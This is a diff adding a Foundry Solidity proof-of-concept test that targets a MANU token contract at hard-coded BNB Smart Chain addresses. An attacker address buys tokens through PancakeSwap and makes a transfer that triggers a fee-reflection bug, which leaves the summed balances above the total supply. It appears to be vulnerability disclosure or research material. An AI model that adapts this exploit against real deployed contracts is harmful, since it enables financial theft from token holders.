@@ -1,0 +1,93 @@
+```solidity
+pragma solidity ^0.6.12;
+
+import "forge-std/Test.sol";
+
+// Minimal interfaces for the PoC
+interface IMANU {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function totalSupply() external view returns (uint256);
+    function owner() external view returns (address);
+}
+
+interface IPancakeRouter {
+    function swapExactETHForTokens(
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external payable returns (uint[] memory amounts);
+}
+
+contract ExploitTest is Test {
+    // Deployed contract addresses on BSC
+    address constant MANU = 0x16be19fb70f902ecf39b54ad988ee427cb1b6848;
+    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+
+    address attacker = address(0xAAAA);
+    address receiver = address(0xBBBB);
+
+    IMANU constant manu = IMANU(MANU);
+
+    function setUp() public {
+        vm.label(MANU, "MANU");
+        vm.label(ROUTER, "PancakeRouter");
+        vm.label(attacker, "Attacker");
+        vm.label(receiver, "Receiver");
+
+        // Give some BNB to the attacker for the initial swap
+        vm.deal(attacker, 10 ether);
+    }
+
+    function testExploit() public {
+        // 1. Attacker buys MANU from PancakeSwap to become a holder
+        address[] memory path = new address[](2);
+        path[0] = WBNB;
+        path[1] = MANU;
+        vm.startPrank(attacker);
+        IPancakeRouter(ROUTER).swapExactETHForTokens{value: 1 ether}(
+            0,  // accept any amount
+            path,
+            attacker,
+            block.timestamp
+        );
+        vm.stopPrank();
+
+        uint256 attackerInitBal = manu.balanceOf(attacker);
+        console.log("Attacker initial MANU balance:", attackerInitBal);
+
+        // 2. Get the contract owner (deployer) who is already in the _accounts array
+        address owner = manu.owner();
+        console.log("Contract owner:", owner);
+
+        // Record total supply before the transfer
+        uint256 totalSupplyBefore = manu.totalSupply();
+        console.log("Total supply before transfer:", totalSupplyBefore);
+
+        // 3. Attacker sends a small amount to another address to trigger the fee distribution bug
+        uint256 transferAmount = 10 ether;
+        vm.prank(attacker);
+        manu.transfer(receiver, transferAmount);
+
+        // 4. Query balances after the transfer
+        uint256 attackerBalAfter = manu.balanceOf(attacker);
+        uint256 receiverBalAfter = manu.balanceOf(receiver);
+        uint256 ownerBalAfter = manu.balanceOf(owner);
+        uint256 totalSupplyAfter = manu.totalSupply();
+
+        console.log("Attacker balance after transfer:", attackerBalAfter);
+        console.log("Receiver balance after transfer:", receiverBalAfter);
+        console.log("Owner balance after transfer:", ownerBalAfter);
+        console.log("Total supply after transfer:", totalSupplyAfter);
+
+        // 5. The bug causes the fee amount to be both reflected to the marketing address
+        //    and distributed to every other holder (including the owner). As a result, the
+        //    sum of the balances of attacker, receiver, and owner exceeds the total supply.
+        uint256 sum = attackerBalAfter + receiverBalAfter + ownerBalAfter;
+        console.log("Sum (attacker + receiver + owner):", sum);
+        assertGt(sum, totalSupplyAfter, "[!] Sum of balances should be greater than totalSupply due to the reflection bug");
+    }
+}
+```
